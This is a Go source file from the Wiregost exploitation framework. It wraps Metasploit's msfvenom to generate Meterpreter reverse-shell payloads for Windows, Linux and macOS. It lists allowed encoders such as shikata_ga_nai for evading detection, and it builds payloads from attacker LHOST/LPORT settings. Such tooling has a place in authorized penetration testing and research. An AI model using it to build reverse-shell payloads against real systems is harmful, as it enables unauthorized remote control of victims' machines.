// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package msf

import (
	"bytes"
	"fmt"
	"os/exec"
	"strconv"
	"strings"

	"github.com/maxlandon/wiregost/server/log"
)

const (
	consoleBin = "msfconsole"
	venomBin   = "msfvenom"
	sep        = "/"
)

var (
	msfLog = log.ServerLogger("msf", "venom")

	// ValidArches - Support CPU architectures
	ValidArches = map[string]bool{
		"x86": true,
		"x64": true,
	}

	// ValidEncoders - Valid MSF encoders
	ValidEncoders = map[string]bool{
		"":                   true,
		"x86/shikata_ga_nai": true,
		"x64/xor_dynamic":    true,
	}

	// ValidPayloads - Valid payloads and OS combos
	ValidPayloads = map[string]map[string]bool{
		"windows": map[string]bool{
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
			"meterpreter/reverse_tcp":   true,
			"meterpreter/reverse_http":  true,
			"meterpreter/reverse_https": true,
		},
		"linux": map[string]bool{
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
		},
		"osx": map[string]bool{
			"meterpreter_reverse_http":  true,
			"meterpreter_reverse_https": true,
			"meterpreter_reverse_tcp":   true,
		},
	}

	ValidFormats = map[string]bool{
		"bash":          true,
		"c":             true,
		"csharp":        true,
		"dw":            true,
		"dword":         true,
		"hex":           true,
		"java":          true,
		"js_be":         true,
		"js_le":         true,
		"num":           true,
		"perl":          true,
		"pl":            true,
		"powershell":    true,
		"ps1":           true,
		"py":            true,
		"python":        true,
		"raw":           true,
		"rb":            true,
		"ruby":          true,
		"sh":            true,
		"vbapplication": true,
		"vbscript":      true,
	}
)

// VenomConfig -
type VenomConfig struct {
	Os         string
	Arch       string
	Payload    string
	Encoder    string
	Iterations int
	LHost      string
	LPort      uint16
	BadChars   []string
	Format     string
	Luri       string
}

// Version - Return the version of MSFVenom
func Version() (string, error) {
	stdout, err := consoleCmd([]string{"--version"})
	return string(stdout), err
}

// VenomPayload - Generates an MSFVenom payload
func VenomPayload(config VenomConfig) ([]byte, error) {

	// OS
	if _, ok := ValidPayloads[config.Os]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid operating system: %s", config.Os))
	}
	// Arch
	if _, ok := ValidArches[config.Arch]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid arch: %s", config.Arch))
	}
	// Payload
	if _, ok := ValidPayloads[config.Os][config.Payload]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid payload: %s", config.Payload))
	}
	// Encoder
	if _, ok := ValidEncoders[config.Encoder]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid encoder: %s", config.Encoder))
	}
	// Check format
	if _, ok := ValidFormats[config.Format]; !ok {
		return nil, fmt.Errorf(fmt.Sprintf("Invalid format: %s", config.Format))
	}

	target := config.Os
	if config.Arch == "x64" {
		target = strings.Join([]string{config.Os, config.Arch}, sep)
	}
	payload := strings.Join([]string{target, config.Payload}, sep)

	// LURI handling for HTTP stager
	luri := config.Luri
	if luri != "" {
		luri = fmt.Sprintf("LURI=%s", luri)
	}

	args := []string{
		"--platform", config.Os,
		"--arch", config.Arch,
		"--format", config.Format,
		"--payload", payload,
		fmt.Sprintf("LHOST=%s", config.LHost),
		fmt.Sprintf("LPORT=%d", config.LPort),
		fmt.Sprintf("EXITFUNC=thread"),
	}

	if luri != "" {
		args = append(args, luri)
	}
	// Check badchars for stager
	if len(config.BadChars) > 0 {
		for _, b := range config.BadChars {
			// using -b instead of --bad-chars
			// as it made msfvenom crash on my machine
			badChars := fmt.Sprintf("-b %s", b)
			args = append(args, badChars)
		}
	}

	if config.Encoder != "" && config.Encoder != "none" {
		iterations := config.Iterations
		if iterations <= 0 || 50 <= iterations {
			iterations = 1
		}
		args = append(args,
			"--encoder", config.Encoder,
			"--iterations", strconv.Itoa(iterations))
	}

	return venomCmd(args)
}

// venomCmd - Execute a msfvenom command
func venomCmd(args []string) ([]byte, error) {
	msfLog.Printf("%s %v", venomBin, args)
	cmd := exec.Command(venomBin, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		msfLog.Printf("--- stdout ---\n%s\n", stdout.String())
		msfLog.Printf("--- stderr ---\n%s\n", stderr.String())
		msfLog.Print(err)
	}

	return stdout.Bytes(), err
}

// consoleCmd - Execute a msfvenom command
func consoleCmd(args []string) ([]byte, error) {
	cmd := exec.Command(consoleBin, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		msfLog.Printf("--- stdout ---\n%s\n", stdout.String())
		msfLog.Printf("--- stderr ---\n%s\n", stderr.String())
		msfLog.Print(err)
	}

	return stdout.Bytes(), err
}

// Arch - Convert golang arch to msf arch
func Arch(arch string) string {
	if arch == "amd64" {
		return "x64"
	}
	return "x86"
}
